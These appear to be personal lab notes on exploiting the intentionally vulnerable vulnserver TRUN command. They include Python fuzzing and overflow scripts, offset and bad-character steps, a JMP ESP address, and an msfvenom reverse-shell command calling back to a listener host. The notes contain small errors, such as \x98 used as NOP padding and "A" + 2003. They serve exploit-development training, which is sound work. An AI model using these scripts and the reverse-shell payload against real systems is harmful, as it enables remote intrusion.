DL's:
    DL enterprise Windows: 
        Install in Win VM:  
            https://www.immunityinc.com/products/debugger/
            sites.google.com/site/lupingreycorner/vulnserver.zip?attredirects=0 
        Make sure to install immunity for ALL users. (python27.dll needs to be on all users)
        ImmunityDebugger - run as admin && vulnserver.exe as admin (both on VM)**
        Turn off all firewall rules on vulnserver Windows box
        vulnserver.exe run on port 9999
        Whenever vulnserver \| immunity crashes - restart

Exploit Development stages:
    I    Spiking - way to find vuln in program
    II   Fuzzing - similar to spiking but high bombardment
    III  Find Offset - where is Vuln
    IV   Overwrite EIP - to conduct buffer overflow
    V    Find bad char - cleanup
    VI   Find right module - cleanup
    VII  generate shellcode - success!

nc -nv <ip_vulnserver> 9999
    HELP **TRUN** spike TRUN 
        TRY spiking all cmds
   
I. Spiking TRUN
    generic_send_tcp:
    SYNTAX:/generic_send_tcp host port spike_script SKIPVAR SKIPSTR (./generic_send_tcp 192.168.1.100 701 spike.spk 0 0)
    generic_send_tcp <ip> 9999 spike.spk
           spike.spk::
             s_readline();
             s_string("STATS "); ## readline STATS && throw var "0" at STATS 
             s_string_variable("0");
             # readline STATS && throw var "0" at STATS 
             # No sucess 
    **Violations are GOOOD**
       access violation when executing "EIP [41414141] (hex AAAA)" https://www.partitionwizard.com/disk-recovery/exception-access-violation.html
            ## with "s_string("TRUN "); in script^^
       Look into registers
            see figure  && E:\Users\Carl\vulnserv.00401848.png
                "0XF0FF68 HT0 - RETURN TO KERNEL32.7582FA29"

II. Fuzzing Trun:
        1.py:: {
    #!/usr/bin/python
    import sys, socket
    from time import sleep
    buffer = "A" * 100 
    while True:
        try:
            payload = "TRUN /.:/" + buffer
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('192.168.86.202',9999))
            print ("[+] Sending the payload...\n" + str(len(buffer)))
            s.send((payload.encode())) 
            s.close()
            sleep(1)
            buffer = buffer + "A"*100 ##append magnitude of 100 to current buffer. 
        except:
            print ("The fuzzing crashed at %s bytes" % str(len(buffer))) # Once crashes - will display byte location
            sys.exit()
                 } ## remove {} for script**
    ./1.py
        Parrot output: "The fuzzing crashed at 2300 bytes"
        vulnserver output: see fuzzTrun.png! [fuzz_trun_reg](fuzzTrun.png)
            ## EIP was not overwritten - but ~location of crash seen: "2300 bytes" **possible bytes required to break .exe**

III Finding Outset: "Pattern Create" 
      /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000 :: output="Aa0..5Co"
         vi 2.py:: {
            #!/usr/bin/python
            import sys, socket
            offset = "Aa0..5Co"
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.86.202',9999))
                s.send(("TRUN /.:/" + offset))
                s.close()
            except:
                print ("Error connecting to server")
                sys.exit()
                   } ## remove {} for script ##
       ## Should obtain value for EIP  && try not to cross ESP 
      output of 2.py :: EIP=00401D98 **possible exploitable offset**  && ESP="XGr" 

IV Overwriting EIP: "B*4 = 42424242"
    a) Now try with offset::
        /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2000 -q 00401D98 :: output="Aa0..5Co"
            ## If : "[*] No exact matches, looking for likely candidates."
                Means in the create byte sequence ("Aa0..5Co"), there was no offset found. Offset is looking for 00401D98
                    Change value of "pattern_create.rb" to include more bytes - which will in turn UP chances of buffer overflow. 
                    **Try pattern_create.rb with 3000 instead of 2000.** see [Crash_With_3000bytes](crash_3000byte.png)
    b) Crash with 3000 bytes:
        /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 :: output="Aa0..Dv9"
            EIP = 386F4337 && ESP = "Co9..cw6"
            Now try with Offset:: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337 ::
                !Success! Output of pattern_offset.rb: "[*] Exact match at offset 2003"
                    ** This is why 2000 bytes did not work. Offset is @ 2003 bytes.**
    c) 2003 byte offset: !Time to control EIP with overwrite!
        3.py :: {
            #!/usr/bin/python
            import sys, socket
            shellcode = "A" * 2003 + "B" * 4
            #2003 A's brings to EIP.
            #EIP is only 4 bytes
            #B will Overwrite EIP.
            #B=42424242 (B ASCII)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.86.202',9999))
                s.send(("TRUN /.:/" + shellcode))
                s.close()
            except:
                print ("Error connecting to server")
                sys.exit()
                } ## remove {} for script ##
        ** See [B42_EIP_control](EIP_control.png) **

V. Finding BadCharacters:: (https://github.com/cytopia/badchars)
        Run hex char through program && find which "actup" - generally null bytes or 0's. (interger/sign overflow)
            edit 2.py
                add variable: badchars = (\x00..\xff)
                    ** delete byte \x00 - already aware it's bad. (Always try \x00 - may cause false positives) **
                    ** once barchar identified - do not want to include in shellcode - it may break shell.
            add to : shellcode = "A" * 2003 + "B" * 4 + barchars
        Run 2.py::
            focus on hexdump of ESP: right click - hexdump
                No badchars with first badchar list (no out of place values in hexdump)
                Note the chars that are MISSING:
                consecutive chars - only first char is BAD char. 
    Run another bad char list: 

VI. Finding Right module: Find .dll with 0 memory protections (https://github.com/corelan/mona)
            mona.py placed -> This PC\LocalDisk(C:)\ProgramFiles(x86)\immunityInc\ImmunityDebugger\Pycommands W/ vulnserver && immunity.
                   -> ThisPC\LocalDisk(C:)\ProgramFiles(x86)\Immunity\ImmunityDebugger\Pycommands
            Lower cmd prompt:"!mona modules" terminal w/ green text should pop up. "Addresses && messages"
                Error popup: ** CRC changed. discarding .udd data ** https://reverseengineering.stackexchange.com/questions/9083/bypassing-crc-check
            Protection settings include: Rebase,SafeSEH,ASLR,NXCompat,OS dll
        ** Looking for: Something attached to process (vulnserver.exe) && all False. **
    Find Opcode equivalent of address to process. see [mona_dll_search](essfunc_dll.png) **AL to HEX**
            locate nasm shell (/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb)
                ** only works on Kali - Parrot throws error
                    nasm > JMP ESP
                    00000000  FFE4              jmp esp
                    ## FFE4 is Hex equivalent of "jmp esp" in AL ##
                    ## We want to find locale where esp is in AL - once there we can inject .dll**
    "!mona find -s "\xff\xe4" -m essfunc.dll"
            Output: "Found a total of 9 pointers"
                Mona will search in essfunc for this reg call. See [reg_ptrs_in_essfunc_mona](ffe4_essfunc.png)
                *Use Address of these pointers* :: 0x625011af..0x625012a05
        edit 2.py:: delete B and replace with EIP address Which is a JMP call::
            shellcode = "A" * 2003 + "\xaf\x11\x50\x62" 
                 #address must be in reverse because w/ x86 arch - it uses little endian formatting
                 #little endian stores low order byte at low address and high order byte at high address 
        Immunity must catch this jmp call:
            "Go to address in Disassembler"
                "Enter expression to follow": enter address (625011af)
                    Press F2 - sets breakpoint (address should turn blue) - program will PAUSE once address is hit. 
            ./2.py:: "breakpoint at essfunc.625011AF" see [BP_essfunc_immunity](essfuncBP.png)

VII Generate Shell Cod3:
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.86.178 LPORT=5555 EXITFUNC=thread -f c -a x86 -b "\x00"
        ## EXITFUNC = more stable shell, -b badchar(to avoid), -a arch, -c export into C, ##
        ## Payload size: space available - sometimes must shrink payload size. 351bytes ITE (in this example)
    copy payload: "\xba\...\xal" Do not need ; because usingn for .py
    edit 2.py
        add variable: overflow = (     ##make sure to enter after 1st parenthesis ##
                      "\xba\...\xal")
        edit line: shellcode = "A" + 2003 + "\xaf\x11\x50\x62" + "\x98" * 32 + overflow
        ## inject 2003 A's: hit EIP -> inject essfunc.dll ("\xaf\x11\x50\x62") -> inject msvenom payload XD
        ## Must add NOP's or "padding" ITE:: \x98 * 32

TODO:: python3 section::